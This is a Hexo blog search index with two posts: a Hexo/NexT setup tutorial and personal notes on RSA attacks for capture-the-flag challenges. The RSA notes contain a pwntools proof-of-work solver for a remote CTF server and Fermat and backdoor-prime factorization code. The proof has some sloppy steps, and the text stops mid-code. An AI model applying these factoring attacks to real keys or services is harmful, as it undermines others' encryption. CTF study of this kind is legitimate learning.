<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>22-10-21-hexo-build-beautify</title>
    <url>/2022/10/21/22-10-21-hexo-build-beautify/</url>
    <content><![CDATA[<p>The article is used to record how to use hexo to build my own blog. I will try my best to make records by using English. To Be Honest, this is really somewhat a hard challenge for me.</p>
<p>The problems and some solutions are as follows.</p>
<span id="more"></span>
<blockquote>
<p><a href="https://hexo-next.readthedocs.io/">https://hexo-next.readthedocs.io/</a></p>
</blockquote>
<h1>BUILD HEXO</h1>
<blockquote>
<p>preparation:</p>
<p>git</p>
<p>node.js</p>
</blockquote>
<p>after the installation, test:</p>
<p><code>node -v</code>/<code>npm -v</code>/ <code>git -v</code></p>
<h2 id="HEXO-BLOG">HEXO BLOG</h2>
<blockquote>
<p>all use git-bash</p>
</blockquote>
<ul>
<li>to install hexo:</li>
</ul>
<p><code>npm install -g hexo-cli</code></p>
<ul>
<li>init hexo and build blog:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init [blogname]</span><br><span class="line">cd [blogname]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<ul>
<li>after building the common commands:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate/hexo g</span><br><span class="line">hexo server/hexo s</span><br><span class="line">hexo deploy/hexo d(unless everything is OK)</span><br><span class="line"># hexo clean &amp;&amp; hexo g &amp; hexo s</span><br></pre></td></tr></table></figure>
<h2 id="NEW-POST">NEW POST</h2>
<ul>
<li>set markdown</li>
</ul>
<p>In <code>scaffolds\post.md</code>, above the <code>!--more--</code> can make the article excerption</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories: </span><br><span class="line">tags: </span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"># to limit the length of article</span><br></pre></td></tr></table></figure>
<ul>
<li>new post</li>
</ul>
<p><code>hexo new [postname]</code></p>
<p>To make the article and everting clean, follow the standard <code>YY-MM-DD-article-name.md</code></p>
<p>And the categories are as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">	- Studing</span><br><span class="line">	- Reading</span><br><span class="line">	- Recording</span><br><span class="line">	- Amusing</span><br></pre></td></tr></table></figure>
<h1>DRAFT/BAND GITHUB</h1>
<ul>
<li>register the github account</li>
<li>new repository</li>
</ul>
<p>Create a new repository, github has reserved your own website.</p>
<p><code>[githubaccount].github.io</code></p>
<ul>
<li>use token to authenticate</li>
</ul>
<p>In the root menu, add the follows to the file <strong>_config.yml</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># install:</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"># _config.yml</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://[token]@github.com/[githubaccount]/[githubaccount].github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<ul>
<li>git config</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># if authentication failed</span><br><span class="line">git config --globaluser.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>after everything above is ready</li>
</ul>
<p><code>hexo d</code>, test if the running is well.</p>
<p>the default website is: <code>localhost:4000/</code></p>
<h1>MATH</h1>
<p>If the markdown can not display well,  maybe the renderer gets wrong.</p>
<p>The hexo default renderer is <code>hexo-renderer-marked</code>.</p>
<p>You can use <code>hexo-renderer-kramed</code> or <code>@upupming/renderer-markdown-it-plus</code> to replace the default one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm i @upupming/hexo-renderer-markdown-it-plus --save</span><br></pre></td></tr></table></figure>
<p><strong>DON’T FORGET!</strong></p>
<p>In <code>_config.next.yml</code> set:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (false) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in front-matter.</span><br><span class="line">  # If you set it to true, it will load mathjax / katex script EVERY PAGE.</span><br><span class="line">  every_page: true</span><br><span class="line"></span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # Available values: none | ams | all</span><br><span class="line">    tags: none</span><br><span class="line"></span><br><span class="line">  katex:</span><br><span class="line">    enable: false</span><br><span class="line">    # See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span><br><span class="line">    copy_tex: false</span><br></pre></td></tr></table></figure>
<p>and in your every post fonts, add <code>math: true</code></p>
<h1>NOT 404</h1>
<h2 id="question">question</h2>
<p>When I visit the tags, the website always return <code>404</code>. I search for some solutions all over the web. However, most of them are wrong, until I see the solution in the Zhihu.</p>
<h2 id="solution">solution</h2>
<h3 id="new-page">new page</h3>
<p>In the root of the blog, open the git bash command.</p>
<p><code>hexo new page &quot;tags&quot;</code></p>
<h3 id="edit-the-index">edit the index</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">type: tags</span><br><span class="line">layout: tags # /theme/next/layout/[tags].njk</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p><em>Behind the layout, to write down <strong>the name of the target njk</strong>, which is in the depth of the file path.</em></p>
<h3 id="edit-the-config-file">edit the _config file</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Dirctory</span><br><span class="line">tag_dir: tags</span><br></pre></td></tr></table></figure>
<p>Make the names one-to-one.</p>
<h1>CALCULATE WORDS</h1>
<h2 id="hexo-word-counter">hexo-word-counter</h2>
<p>Install the plugin <code>hexo-word-counter</code>, in the root path of blog.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-word-counter</span><br><span class="line">hexo clean &amp;&amp; hexo g</span><br></pre></td></tr></table></figure>
<h2 id="config">config</h2>
<p>In <code>_config.yml</code>, at the end of the file add the follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>
<p><em>In <code>_config.next.yml</code>, edit the finding <code>item_text_total: false</code>. Change <code>false</code> to <code>true</code>.</em></p>
<h1>BACKGROUND PICTURE</h1>
<p>I tried more ways to set background picture, more thins were wrong. Util I saw an article, I done this thing.</p>
<p>When I reflected all my things on this part, I knew the keypoint part was to **add the correct source path **to <code>next_config</code>.</p>
<h2 id="js-file">js file</h2>
<p>The NexT v8 has the <code>canvas-nest.js</code> in <code>themes\next\source\js</code>.</p>
<p>If you don’t have the <strong>JS</strong> file, create the new file contains：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">n,e,t</span>)&#123;<span class="keyword">return</span> n.<span class="title function_">getAttribute</span>(e)||t&#125;<span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">n</span>)&#123;<span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(n)&#125;<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> t=<span class="title function_">e</span>(<span class="string">&quot;script&quot;</span>),o=t.<span class="property">length</span>,i=t[o-<span class="number">1</span>];<span class="keyword">return</span>&#123;<span class="attr">l</span>:o,<span class="attr">z</span>:<span class="title function_">n</span>(i,<span class="string">&quot;zIndex&quot;</span>,-<span class="number">1</span>),<span class="attr">o</span>:<span class="title function_">n</span>(i,<span class="string">&quot;opacity&quot;</span>,<span class="number">.5</span>),<span class="attr">c</span>:<span class="title function_">n</span>(i,<span class="string">&quot;color&quot;</span>,<span class="string">&quot;0,0,0&quot;</span>),<span class="attr">n</span>:<span class="title function_">n</span>(i,<span class="string">&quot;count&quot;</span>,<span class="number">99</span>)&#125;&#125;<span class="keyword">function</span> <span class="title function_">o</span>(<span class="params"></span>)&#123;c=u.<span class="property">width</span>=<span class="variable language_">window</span>.<span class="property">innerWidth</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span>,a=u.<span class="property">height</span>=<span class="variable language_">window</span>.<span class="property">innerHeight</span>||<span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>||<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>&#125;<span class="keyword">function</span> <span class="title function_">i</span>(<span class="params"></span>)&#123;l.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,c,a);<span class="keyword">var</span> n,e,t,o,u,d,x=[w].<span class="title function_">concat</span>(y);y.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">i</span>)&#123;<span class="keyword">for</span>(i.<span class="property">x</span>+=i.<span class="property">xa</span>,i.<span class="property">y</span>+=i.<span class="property">ya</span>,i.<span class="property">xa</span>*=i.<span class="property">x</span>&gt;c||i.<span class="property">x</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,i.<span class="property">ya</span>*=i.<span class="property">y</span>&gt;a||i.<span class="property">y</span>&lt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>,l.<span class="title function_">fillRect</span>(i.<span class="property">x</span>-<span class="number">.5</span>,i.<span class="property">y</span>-<span class="number">.5</span>,<span class="number">1</span>,<span class="number">1</span>),e=<span class="number">0</span>;e&lt;x.<span class="property">length</span>;e++)n=x[e],i!==n&amp;&amp;<span class="literal">null</span>!==n.<span class="property">x</span>&amp;&amp;<span class="literal">null</span>!==n.<span class="property">y</span>&amp;&amp;(o=i.<span class="property">x</span>-n.<span class="property">x</span>,u=i.<span class="property">y</span>-n.<span class="property">y</span>,d=o*o+u*u,d&lt;n.<span class="property">max</span>&amp;&amp;(n===w&amp;&amp;d&gt;=n.<span class="property">max</span>/<span class="number">2</span>&amp;&amp;(i.<span class="property">x</span>-=<span class="number">.03</span>*o,i.<span class="property">y</span>-=<span class="number">.03</span>*u),t=(n.<span class="property">max</span>-d)/n.<span class="property">max</span>,l.<span class="title function_">beginPath</span>(),l.<span class="property">lineWidth</span>=t/<span class="number">2</span>,l.<span class="property">strokeStyle</span>=<span class="string">&quot;rgba(&quot;</span>+m.<span class="property">c</span>+<span class="string">&quot;,&quot;</span>+(t+<span class="number">.2</span>)+<span class="string">&quot;)&quot;</span>,l.<span class="title function_">moveTo</span>(i.<span class="property">x</span>,i.<span class="property">y</span>),l.<span class="title function_">lineTo</span>(n.<span class="property">x</span>,n.<span class="property">y</span>),l.<span class="title function_">stroke</span>()));x.<span class="title function_">splice</span>(x.<span class="title function_">indexOf</span>(i),<span class="number">1</span>)&#125;),<span class="title function_">r</span>(i)&#125;<span class="keyword">var</span> c,a,u=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>),m=<span class="title function_">t</span>(),d=<span class="string">&quot;c_n&quot;</span>+m.<span class="property">l</span>,l=u.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>),r=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">oRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>||<span class="keyword">function</span>(<span class="params">n</span>)&#123;<span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(n,<span class="number">1e3</span>/<span class="number">45</span>)&#125;,x=<span class="title class_">Math</span>.<span class="property">random</span>,w=&#123;<span class="attr">x</span>:<span class="literal">null</span>,<span class="attr">y</span>:<span class="literal">null</span>,<span class="attr">max</span>:<span class="number">2e4</span>&#125;;u.<span class="property">id</span>=d,u.<span class="property">style</span>.<span class="property">cssText</span>=<span class="string">&quot;position:fixed;top:0;left:0;z-index:&quot;</span>+m.<span class="property">z</span>+<span class="string">&quot;;opacity:&quot;</span>+m.<span class="property">o</span>,<span class="title function_">e</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(u),<span class="title function_">o</span>(),<span class="variable language_">window</span>.<span class="property">onresize</span>=o,<span class="variable language_">window</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params">n</span>)&#123;n=n||<span class="variable language_">window</span>.<span class="property">event</span>,w.<span class="property">x</span>=n.<span class="property">clientX</span>,w.<span class="property">y</span>=n.<span class="property">clientY</span>&#125;,<span class="variable language_">window</span>.<span class="property">onmouseout</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;w.<span class="property">x</span>=<span class="literal">null</span>,w.<span class="property">y</span>=<span class="literal">null</span>&#125;;<span class="keyword">for</span>(<span class="keyword">var</span> y=[],s=<span class="number">0</span>;m.<span class="property">n</span>&gt;s;s++)&#123;<span class="keyword">var</span> f=<span class="title function_">x</span>()*c,h=<span class="title function_">x</span>()*a,g=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>,p=<span class="number">2</span>*<span class="title function_">x</span>()-<span class="number">1</span>;y.<span class="title function_">push</span>(&#123;<span class="attr">x</span>:f,<span class="attr">y</span>:h,<span class="attr">xa</span>:g,<span class="attr">ya</span>:p,<span class="attr">max</span>:<span class="number">6e3</span>&#125;)&#125;<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">i</span>()&#125;,<span class="number">100</span>)&#125;();</span><br></pre></td></tr></table></figure>
<h2 id="add-path">add path</h2>
<p>My NexT layout file is in the path <code>themes\next\layout\_layout.njk</code>.</p>
<p>For we created the js file, we saved as <code>canvas-nest.js</code>. Open the <code>_layout.njk</code>, and add the following words. <em>REMEMBER above the <code>&lt;/body&gt;</code></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Background picture --&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; src=&quot;/js/canvas-nest.js&quot;&gt;	   &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1>ICON</h1>
<blockquote>
<p><a href="https://fontawesome.com/search">https://fontawesome.com/search</a></p>
</blockquote>
<h1>ATTACH FILES</h1>
<p>We may hope visitors that can download files easily and conveniently. Thus, we can upload our relating files onto the same name file. Eg. The post is named <code>22-10-21-hexo-build-beautify.md</code>, and its same name file is <code>22-10-21-hexo-build-beautify</code>. They are created at the same time.</p>
<p>After uploading, and you can quote the file path in the post. And we can download these things while visiting.</p>
<ul>
<li>Picture <code>![filename](filepath)</code></li>
<li>Zip <code>[filename](filepath)</code></li>
<li>……</li>
</ul>
<p><em>At the same path!</em></p>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>self_promtion</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-04-RSA</title>
    <url>/2022/11/04/22-11-04-RSA/</url>
    <content><![CDATA[<p><strong>JUST</strong> conclude the attacks about RSA.</p>
<p>Make a record for myself.</p>
<span id="more"></span>
<h1>RSA</h1>
<h2 id="Algorithm">Algorithm</h2>
<ul>
<li>produce large primes $p$ and $q$</li>
<li>calculate $n = p \times q$</li>
<li>use <strong>Euler’s totient function</strong> to get $\varphi(n) = (p-1) \times (q-1)$, in code we usually use $N$ or $phi$</li>
<li>define $e$ which satisfies the condition that $gcd(e, \varphi(n)) = 1$, and the $e$ is between 1 and $\varphi(n)$</li>
<li>calculate $d$ and the $d$ comes from $de \equiv 1 \mod \varphi(n)$</li>
<li><strong>encrypt: $c \equiv m^{e} \mod n$</strong></li>
<li><strong>decrypt: $m \equiv c^{d} \mod n$</strong></li>
<li>PUBLICKEY: PU{e, n}</li>
<li>PRIVATEKEY: PR{p, q, d}</li>
</ul>
<h2 id="Proof">Proof</h2>
<p>$$<br>
m \equiv c^{d} \mod n \equiv m^{de} \mod n \equiv m^{k\varphi(n) + 1} \mod n \equiv m \mod n<br>
$$</p>
<p>use the <strong>Fermat’s little theorem</strong> deduce:<br>
$$<br>
m^{n} \equiv m \mod n\<br>
$$</p>
<p>$$<br>
m^{n-1} \equiv m^{\varphi(n)} \equiv 1 \mod n\<br>
$$</p>
<h3 id="m-n-are-relatively-prime">$m$, $n$ are relatively-prime</h3>
<p>the $m^{k\varphi(n)}$:<br>
$$<br>
m^{k\varphi(n)} \equiv 1\mod n\<br>
$$</p>
<p>$$<br>
\Longrightarrow m^{k\varphi(n) + 1} \equiv m \mod n<br>
$$</p>
<h3 id="m-n-not-relatively-prime">$m$,$n$ not relatively-prime</h3>
<p>preparation:<br>
$$<br>
gcd(m, n) \neq 1\<br>
$$<br>
$$<br>
n = p \times q\<br>
$$</p>
<p>$$<br>
\Longrightarrow n = kp\<br>
$$</p>
<p>$$<br>
k, p \ are \ relatively-prime<br>
$$</p>
<p>also <strong>Fermat’s little theorem</strong>:<br>
$$<br>
(kp)^{q-1} \equiv 1 \mod q<br>
$$<br>
based on the properties of con-gruences multiplication property:<br>
$$<br>
(kp)^{(p-1)\times (q-1) \times k} (kp) \equiv (kp) \mod q<br>
$$<br>
substitute the $\varphi(n)$ and $de \equiv 1 \mod \varphi(n)$:<br>
$$<br>
\varphi(n) = (p-1) \times (q-1)\<br>
$$<br>
$$<br>
de = 1 + k \times \varphi(n)\<br>
$$</p>
<p>$$<br>
\Longrightarrow (kp)^{de} \equiv (kp) \mod q\<br>
$$</p>
<p>$$<br>
\Longrightarrow (kp)^{de}=kp + tq<br>
$$</p>
<p>thus, $tq | kq$ and $t|p$ for $q$ is prime:<br>
$$<br>
assume: t = t\times p\<br>
$$<br>
$$<br>
(kp)^{de} = tq + kp = t\times p\times q + k \times p = tn + kp\<br>
$$</p>
<p>$$<br>
(kp)^{de} = m + tn \equiv m \mod n<br>
$$</p>
<p>proved.</p>
<h2 id="Preparation">Preparation</h2>
<ul>
<li>gmpy2</li>
<li>python3.7+</li>
<li>pycharm</li>
<li>sagemath</li>
</ul>
<h1>NC CHALLENGE</h1>
<p>Before nc real connection, you need to receive the challenge and make a solution about it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet = digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line">sha256 = <span class="string">&#x27;9a579edf6cdd9ed39efc1ccc754e7bb15d52e3d9cabcd66c7042fa1a59fc2836&#x27;</span></span><br><span class="line">tail = <span class="string">&#x27;j60BfGY9sSnkMi9H&#x27;</span></span><br><span class="line">xxxx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data = i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha = hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha == sha256):</span><br><span class="line">        xxxx = data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure>
<p><em>change sha256/tail and crack xxxx</em></p>
<p>Or use the connecting function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28826</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sha256(XXXX&#x27;</span>)</span><br><span class="line">    line = r.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    tmp = line[line.find(<span class="string">&#x27;+&#x27;</span>) + <span class="number">1</span>:line.find(<span class="string">&#x27;)&#x27;</span>)]</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    aim = line[line.find(<span class="string">&#x27;== &#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">    <span class="built_in">print</span>(aim)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    ans = i + j + k + l</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256((ans + tmp).encode()).hexdigest() == aim:</span><br><span class="line">                        <span class="built_in">print</span>(ans)</span><br><span class="line">                        r.recvuntil(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">                        r.sendline(ans.encode())</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">proof()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1>MODULUS FACTORIZATION</h1>
<p>Or we can call it <code>Original_RSA</code>.</p>
<p>The main target in RSA problems is to factorize <code>n</code> to <code>p</code> and <code>q</code>.</p>
<p>Here is the code of <code>Original_RSA</code> which is the basic attack among RSA attacks.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p, q, e, c, n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)    </span><br><span class="line">    d = <span class="built_in">int</span>(gmpy2.invert(e,N))  <span class="comment"># mpz() may run error, convert to int()</span></span><br><span class="line">    <span class="comment"># d = gmpy2.invert(e,N)</span></span><br><span class="line">    m = gmpy2.powmod(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<p><strong>BUT HOW TO FACTORIZE THE $n$?</strong></p>
<p>It is the significant question. Follows are some solutions that I met.</p>
<h2 id="Factorize">Factorize</h2>
<h3 id="factordb">factordb</h3>
<blockquote>
<p><a href="http://factordb.com/">factordb.com</a></p>
</blockquote>
<p>A database contains many $n$ that has been factorized.</p>
<h3 id="yafu-x64">yafu-x64</h3>
<p>The $p$,$q$ differ very well or a little or $p$,$q$  are smooth and produced by $\rho -1 $or $\rho + 1 $.</p>
<p><strong>usage</strong></p>
<ul>
<li>
<p>yafu-x64 factor()</p>
</li>
<li>
<p>yafu-x64 factor(@) -batchfile [filename] <em>!remember the number saved in file and need a <code>\n</code></em></p>
</li>
</ul>
<h3 id="msieve153">msieve153</h3>
<p>Which is similar to yafu-x64</p>
<h3 id="RSAConverter">RSAConverter</h3>
<p>Based on CRT.</p>
<p><strong>usage</strong></p>
<ul>
<li>
<p>$n$, $d$ convert to hex and delete <code>0x</code></p>
</li>
<li>
<p>$e$ convert to hex and delete <code>x</code></p>
</li>
</ul>
<h3 id="fermath-factorization">fermath factorization</h3>
<p>p,q have a little difference</p>
<ul>
<li>p or q created by <code>next_prime()</code>
<ul>
<li>find the Reference Substance <code>n_2</code> which can be produced by <code>iroot(n, 2)[0]</code></li>
<li>p and q are primes, and $p&lt;n_2&lt;q$</li>
<li>we can get $q$ by <code>next_prime(n_2)</code></li>
<li>and <code>p = n // q</code></li>
</ul>
</li>
<li>p and q are similar but not neighbors
<ul>
<li>also find the <code>n_2</code></li>
<li>with <code>n_2</code> as a center, step size 1 and right</li>
<li>if find $p$ and $q$ satisfied the condition, and we get the true $p$ and $q$</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fermat Factorization 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Fermat Factorization</span></span><br><span class="line"><span class="string">    conditon:</span></span><br><span class="line"><span class="string">        1. n is odd</span></span><br><span class="line"><span class="string">        2. satisfy the equation (p-q)(p+q)</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: result</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b_2 = a*a - n</span><br><span class="line">        b, index = gmpy2.iroot(b_2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            result = [<span class="built_in">int</span>(a + b), <span class="built_in">int</span>(a - b)]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h3 id="backdoor">backdoor</h3>
<blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<p>$$<br>
Prime = k \times M + 65537^{a} \mod M<br>
$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Backdoor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    primes list can produced by primes_first_n() in sagemath</span></span><br><span class="line"><span class="string">    reference:[GKCTF2020]Backdoor</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param n:modulo</span></span><br><span class="line"><span class="string">    :return:p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    val = <span class="number">39</span> <span class="comment"># edit</span></span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    primes = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>,</span><br><span class="line">              <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>,</span><br><span class="line">              <span class="number">227</span>, <span class="number">229</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">251</span>, <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>,</span><br><span class="line">              <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>, <span class="number">379</span>, <span class="number">383</span>, <span class="number">389</span>, <span class="number">397</span>, <span class="number">401</span>, <span class="number">409</span>, <span class="number">419</span>, <span class="number">421</span>, <span class="number">431</span>, <span class="number">433</span>, <span class="number">439</span>, <span class="number">443</span>, <span class="number">449</span>, <span class="number">457</span>, <span class="number">461</span>, <span class="number">463</span>,</span><br><span class="line">              <span class="number">467</span>, <span class="number">479</span>, <span class="number">487</span>, <span class="number">491</span>, <span class="number">499</span>, <span class="number">503</span>, <span class="number">509</span>, <span class="number">521</span>, <span class="number">523</span>, <span class="number">541</span>, <span class="number">547</span>, <span class="number">557</span>, <span class="number">563</span>, <span class="number">569</span>, <span class="number">571</span>, <span class="number">577</span>, <span class="number">587</span>, <span class="number">593</span>, <span class="number">599</span>, <span class="number">601</span>, <span class="number">607</span>,</span><br><span class="line">              <span class="number">613</span>, <span class="number">617</span>, <span class="number">619</span>, <span class="number">631</span>, <span class="number">641</span>, <span class="number">643</span>, <span class="number">647</span>, 